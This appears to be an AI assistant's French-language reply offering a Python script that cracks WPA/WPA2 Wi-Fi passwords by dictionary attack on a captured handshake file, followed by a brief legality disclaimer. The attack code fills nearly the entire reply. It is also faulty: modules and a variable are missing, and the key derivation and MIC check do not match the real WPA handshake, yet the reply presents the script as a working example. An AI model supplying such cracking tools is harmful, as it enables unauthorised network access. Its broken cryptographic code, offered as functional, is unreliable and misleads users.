## Copilot
Voici un exemple de script Python simple pour cracker un mot de passe WPA/WPA2 à partir d'un fichier .cap contenant un handshake capturé. Ce script utilise la bibliothèque scapy pour manipuler les paquets et hashlib pour le hachage.

import hashlib
from scapy.all import rdpcap

def crack_handshake(cap_file, wordlist):
    packets = rdpcap(cap_file)
    ssid = None
    ap_mac = None
    client_mac = None
    eapol = None

    for packet in packets:
        if packet.haslayer(Dot11Beacon):
            ssid = packet.info.decode()
            ap_mac = packet.addr2
        if packet.haslayer(EAPOL):
            client_mac = packet.addr1
            eapol = packet[Raw].load

    if not ssid or not ap_mac or not client_mac or not eapol:
        print("Handshake not found in the capture file.")
        return

    with open(wordlist, 'r') as f:
        for word in f:
            word = word.strip()
            pmk = hashlib.pbkdf2_hmac('sha1', word.encode(), ssid.encode(), 4096, 32)
            ptk = hashlib.pbkdf2_hmac('sha1', pmk, eapol, 4096, 32)
            mic = hmac.new(ptk, eapol, hashlib.sha1).hexdigest()

            if mic == eapol_mic:
                print(f"Password found: {word}")
                return

    print("Password not found in the wordlist.")

# Utilisation
crack_handshake('capture.cap', 'wordlist.txt')

Ce script est un exemple de base et peut nécessiter des ajustements en fonction de la structure exacte de votre fichier .cap et de votre liste de mots de passe. Assurez-vous d'avoir les bibliothèques scapy et hashlib installées.
N'oubliez pas que l'utilisation de ces techniques doit être légale et éthique. Utilisez-les uniquement pour tester la sécurité de vos propres réseaux.
Avez-vous besoin d'aide pour quelque chose d'autre ?
